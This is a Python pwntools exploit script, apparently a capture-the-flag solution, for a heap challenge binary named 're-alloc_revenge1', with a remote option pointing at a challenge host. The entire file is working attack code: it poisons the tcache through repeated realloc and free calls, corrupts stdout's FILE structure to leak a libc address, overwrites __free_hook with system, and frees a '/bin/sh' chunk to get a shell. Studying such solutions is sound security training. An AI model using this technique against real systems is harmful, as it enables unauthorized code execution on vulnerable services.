#! /usr/bin/env python3
from pwn import *

def debug():
    gdb.attach(p)
    pause()


bps = []
pie = 1


def gdba():
    if local == 0:
        return 0
    cmd = 'set follow-fork-mode parent\n'
    # cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p, cmd)


def eat():
    p.recvuntil('Your choice: ')


def malloc(idx, size, content):
    eat()
    p.sendline('1')
    p.recvuntil('Index:')
    p.sendline(str(idx))
    p.recvuntil('Size:')
    p.send(str(size))
    p.recvuntil('Data:')
    p.send(content)


def realloc(idx, size, content):
    eat()
    p.sendline('2')
    p.recvuntil('Index:')
    p.send(str(idx))
    p.recvuntil('Size:')
    p.send(str(size))
    p.recvuntil('Data:')
    p.send(content)


def realloc_0(idx):
    eat()
    p.sendline('2')
    p.recvuntil('Index:')
    p.send(str(idx))
    p.recvuntil('Size:')
    p.send(str(0))


def delete(idx):
    eat()
    p.sendline('3')
    p.recvuntil('Index:')
    p.send(str(idx))


while True:
    try:
        arch = 64
        challenge = './re-alloc_revenge1'

        context.os = 'linux'
        # context.log_level = 'debug'
        if arch == 64:
            context.arch = 'amd64'
        if arch == 32:
            context.arch = 'i386'
        context.terminal = ['tmux', 'splitw', '-h']
        elf = ELF(challenge)
        libc = ELF('libc.so')

        local = 1
        if local:
            p = process(challenge)
        else:
            p = remote('chuj.top', '53178')

        tcache = 0x4010
        malloc(0, 0x70, '\n')
        realloc(0, 0x50, '\n')
        realloc(0, 0x10, '\n')
        delete(0)#! 0X20 0X40 0X20
        
        malloc(0, 0x30, '\n')#! 0x270
        realloc_0(0)  #! size 0x40
        

        for i in range(6):
            realloc(0, 0x30, p64(0) + p64(0))  #* size 0x40 bk = 0 bypass key
            realloc_0(0)
        
        realloc(0, 0x30, p16(tcache))#! 0x270
        
        malloc(1, 0x30, p64(0) + p64(0))#! 0x270
        debug()
        realloc(0, 0x10, p64(0) + p64(0))#! 0x270, size=0x20，bypass entry 0x30
        delete(0)#! tcache 0x20[4]
        
        
        
        malloc(0, 0x30, '\x00' * 0x23 + '\xFF\x00')#! (0x250)tcache[ff]
        
        delete(0)#! tcache 进 unsorted
        
        
        malloc(0, 0x40, '\xFF\x01\xff'.ljust(0x40, '\xFF'))#* 0x40 0x50 为 7f,0x20被破坏，且最低位置\x00，
        
        delete(1)#! 0x270, size=0x20, enter fastbin
        
        stdout = 0x0760

        realloc(0,0x58,b'\xFF\xFF\x06\xFF'.ljust(0x40,b'\xFF') + p64(0) + p64(0) + p16(stdout))
        debug()
        malloc(1,0x30,p64(0xfbad1887) + p64(0) * 3)#* off-by-one
        
        
        p.recv(0x58)#* bypass off-by-one
        
        libc.address = u64(p.recvuntil(b'\x7f').ljust(8, b'\x00')) - libc.symbols["_IO_file_jumps"]
        log.success("libc.address: " + hex(libc.address))

        free_hook = libc.symbols['__free_hook']
        log.success("__free_hook: " + hex(free_hook))

        system = libc.symbols['system']
        log.success("system: " + hex(system))
        
        
        realloc(0,0x78,b'\x07\x07'.ljust(0x40,b'\x07') + p64(0) + p64(0) + p64(free_hook - 8) * 5)
        debug()
        delete(0)#* (0x20-0x90)tcache[0] 0-1=255
        debug()
        malloc(0,0x60,b'/bin/sh\x00' + p64(system))
        debug()
        delete(0)
        debug()
        
        
    except EOFError:
        p.close()
        continue
    else:
        p.interactive()
        break
    